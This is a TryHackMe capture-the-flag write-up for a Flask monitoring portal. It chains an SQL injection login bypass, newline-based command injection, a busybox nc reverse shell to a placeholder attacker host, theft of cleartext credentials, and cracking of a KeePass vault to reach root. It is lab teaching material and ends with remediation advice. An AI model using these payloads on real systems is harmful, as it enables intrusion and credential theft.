# Silent Monitor — TryHackMe Writeup

> **Room:** [Silent Monitor](https://tryhackme.com/room/silentmonitor) · **Difficulty:** Medium
> **Category:** Web / Boot2Root (Flask)
> **Author of writeup:** 0xnyx
> **Goal:** Break into a NOC monitoring portal, pivot through the system, and crack your way to root.

> ⚠️ In line with TryHackMe's write-up policy, **no flags, passwords, or cracked values are included** — only the method, so you can reproduce every step yourself.

---

## How to read this writeup

Every step is **Do** (the command/action) → **You get** (what comes back) → **Why / what next** (what it means and where it leads). The whole box is a chain: SQLi login → command injection → leaked creds → KeePass crack → root.

---

## Step 1 — Port scan

**Do** — Version scan of the top 1000 ports. `-Pn` skips ping (THM blocks it).

```bash
nmap -sVC -T4 -Pn <TARGET>
```

**You get**

```
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu
5050/tcp open  http     Werkzeug httpd 2.0.2 (Python 3.10.12)
|_http-title: CorpNet — Network Operations Centre
```

**Why / what next** — Only SSH and a web app on the **non-standard port 5050**. `Werkzeug` = a **Python Flask** app. We have no SSH creds, so the web app is the way in. (A full `nmap -p-` confirms there are no other ports — the "internal service" lives *inside* this app.)

---

## Step 2 — Enumerate the web app

**Do** — Browse the site, read the source for links/comments, and brute-force routes.

```bash
curl -s http://<TARGET>:5050/ | sed 's/<[^>]*>//g' | grep -vE '^\s*$'
feroxbuster -u http://<TARGET>:5050 -w /usr/share/wordlists/dirb/common.txt -x py,txt
```

**You get** — The homepage is a **static** marketing page (no forms, no links). Common wordlists find only `/`. The page text advertises: *"ICMP and TCP service checks"*, *"host health verification"*, and an *"Operator Audit Trail"*.

**Why / what next** — The real app is behind a route that common wordlists miss. Think about the theme — a NOC portal needs an operator login. Trying **`/internal`** reveals a login portal. (A bigger wordlist like seclists `raft-medium` would also find it.)

```bash
curl -s http://<TARGET>:5050/internal | grep -iE '<form|<input|action|method'
# <form method="POST" action="/internal"> ... name="username" ... name="password"
```

---

## Step 3 — Initial access: SQL injection auth bypass

**Do** — The `/internal` login POSTs `username` + `password`. If the app builds its SQL query by string concatenation, a classic boolean payload in the username makes the `WHERE` clause always true. Save the session cookie with `-c`.

```bash
curl -s -i -c cookies.txt -X POST http://<TARGET>:5050/internal \
  --data-urlencode "username=' or 1 or '" \
  --data-urlencode "password=x"
```

**You get**

```
HTTP/1.0 302 FOUND
Location: http://<TARGET>:5050/internal/dashboard
Set-Cookie: session=<FLASK_SESSION>; HttpOnly; Path=/
```

**Why / what next** — The `302 → /internal/dashboard` plus a session cookie means we logged in **without a valid password** — the `' or 1 or '` turned the auth check always-true. The Flask session cookie is base64-encoded JSON (decode it to see `role=operator, user=netops`). We're now an authenticated operator. Next: explore what the dashboard lets an operator *do*.

> **Browser version:** in the login box, username = `' or 1 or '`, password = anything → you land on the dashboard.

---

## Step 4 — Find the command-injection point

**Do** — View the dashboard (with the cookie) and follow its nav links.

```bash
curl -s -b cookies.txt http://<TARGET>:5050/internal/dashboard | grep -iE '/internal/|<a href'
# -> link to /internal/health
curl -s -b cookies.txt http://<TARGET>:5050/internal/health | grep -iE '<form|<input|name=|placeholder'
# <form method="POST" action="/internal/health"> ... name="target" placeholder="hostname or x.x.x.x"
```

**You get** — A **"Host Health Check"** page: a form with a `target` field that runs a `ping` against whatever you enter.

**Why / what next** — A feature that takes user input and feeds it to `ping` on the server is a textbook **command-injection** target. First confirm the normal behaviour:

```bash
curl -s -b cookies.txt -X POST http://<TARGET>:5050/internal/health \
  --data-urlencode "target=127.0.0.1" | sed 's/<[^>]*>//g' | grep -A6 "ping"
# shows:  $ ping -c 2 -W 1 127.0.0.1   ... real ping output
```

So our input is placed directly after `ping -c 2 -W 1`. Now break out of it.

---

## Step 5 — Command injection (newline filter bypass)

**Do** — The usual separators (`;`, `|`, `&`, `&&`) are **filtered**. A **literal newline** (`\n`) is not — it ends the `ping` line and starts a new command. In `curl`, `--data-urlencode $'...\n...'` sends a real newline (URL-encoded to `%0A`, which the server decodes). Prove execution with `id`:

```bash
curl -s -b cookies.txt -X POST http://<TARGET>:5050/internal/health \
  --data-urlencode $'target=127.0.0.1\nid' | sed 's/<[^>]*>//g' | grep uid
```

**You get**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Why / what next** — Arbitrary command execution as **www-data** → RCE confirmed. Turn it into an interactive reverse shell. `busybox nc -e` is reliable where plain `nc` lacks `-e`.

**Do** — Start a listener on your Kali, then fire the payload (replace `<ATTACKER>`/`<PORT>`):

```bash
# Terminal 1 (Kali):
nc -lvnp <PORT>

# Terminal 2 (Kali):
curl -s -b cookies.txt -X POST http://<TARGET>:5050/internal/health \
  --data-urlencode $'target=127.0.0.1\nbusybox nc <ATTACKER> <PORT> -e /bin/bash'
```

**You get** — A shell as `www-data` in `/opt/netops`. Stabilise it:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Step 6 — Credential discovery → SSH

**Do** — We landed in the web app's directory. List it and read the config.

```bash
ls -la /opt/netops
cat /opt/netops/secret.config
```

**You get** — `secret.config` contains a `[backup_agent]` section with a **service account** (`run_as = sysadmin`) and its **password** in cleartext.

**Why / what next** — Cleartext creds in a config file = instant lateral move. SSH in as `sysadmin` for a stable session (much better than the reverse shell) and grab the user flag:

```bash
ssh sysadmin@<TARGET>          # password from secret.config
id                             # uid=1001(sysadmin)
cat ~/user.txt                 # <USER FLAG>
```

---

## Step 7 — Loot the KeePass vault

**Do** — Enumerate the home directory.

```bash
ls -la ~/backups
# README.txt + infrastructure.kdbx   <- a KeePass credential database
```

**You get** — A KeePass database `infrastructure.kdbx`. The vault almost certainly holds higher-privilege credentials.

**Why / what next** — Exfiltrate it to Kali and crack the master password. Easiest transfer is `scp` with the sysadmin creds:

```bash
# on Kali:
scp sysadmin@<TARGET>:~/backups/infrastructure.kdbx .
```

---

## Step 8 — Crack the KeePass master password

**Do** — First try the usual `keepass2john` + `john`:

```bash
keepass2john infrastructure.kdbx > kdbx.hash
```

**You get**

```
! infrastructure.kdbx : File version '40000' is currently not supported!
```

**Why / what next** — This is a **KDBX v4** database. v4 uses the **Argon2** KDF, which `john`/`hashcat` can't crack (no GPU mode, so your RTX 3050 won't help here). The right tool is **`keepass4brute`**, which drives `keepassxc-cli` to try each password by actually opening the vault:

```bash
sudo apt install -y keepassxc           # provides keepassxc-cli
git clone https://github.com/r3nt0n/keepass4brute
./keepass4brute/keepass4brute.sh infrastructure.kdbx /usr/share/wordlists/rockyou.txt
```

**You get** — `[*] Password found: <MASTER_PW>` (a common word, found early in rockyou — it's slow at ~1800/min, but CTF master passwords sit near the top).

**Why / what next** — With the master password we can open the vault and read every stored entry.

---

## Step 9 — Extract root creds → privilege escalation

**Do** — List the vault entries, then reveal the root entry's password (`-s` shows the password):

```bash
keepassxc-cli ls infrastructure.kdbx                 # enter master password
# -> entry: "Root User Password - Sensitive"
keepassxc-cli show -s infrastructure.kdbx "Root User Password - Sensitive"
```

**You get** — `UserName: root` and the **root password** in cleartext.

**Why / what next** — Use it to become root over the existing SSH session:

```bash
# in the sysadmin SSH session:
su root                      # enter the password from the vault
id                           # uid=0(root)
cat /root/root.txt           # <ROOT FLAG>
```

**You get** — `uid=0(root)` and the root flag. Box fully owned. 🏁

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1–2 | nmap + route discovery | Found Flask app + `/internal` login |
| 3 | SQLi auth bypass (`' or 1 or '`) | operator session (netops) |
| 4–5 | Command injection (newline bypass) | RCE as www-data → reverse shell |
| 6 | `secret.config` creds | SSH as sysadmin + user flag |
| 7 | `infrastructure.kdbx` in backups | KeePass vault obtained |
| 8 | keepass4brute + rockyou | Master password |
| 9 | Root entry in vault → `su root` | root flag |

## Lessons

- A static landing page with only one port still has hidden routes — think about the app's **theme** (`/internal` for a NOC portal) and use a large wordlist.
- String-concatenated SQL = **auth bypass** with `' or 1 or '`.
- When a command-injection filter blocks `;`/`|`/`&`, try a **literal newline**, `$(...)`, or backticks.
- **Cleartext creds in config/backup files** are a classic lateral-move spot.
- **KDBX v4 = Argon2** → not crackable by john/hashcat; use `keepass4brute` (keepassxc-cli). KDBX v1/v2 would use hashcat `-m 13400`.

## Remediation

- Use parameterized queries / prepared statements for authentication.
- Never pass user input to a shell; use a safe library (`subprocess` with an argument list, no `shell=True`) and validate input.
- Don't store service-account or root passwords in cleartext config files or shared backups.
- Protect KeePass vaults with a strong, non-dictionary master password.

---

*Write-up for [TryHackMe — Silent Monitor](https://tryhackme.com/room/silentmonitor).*
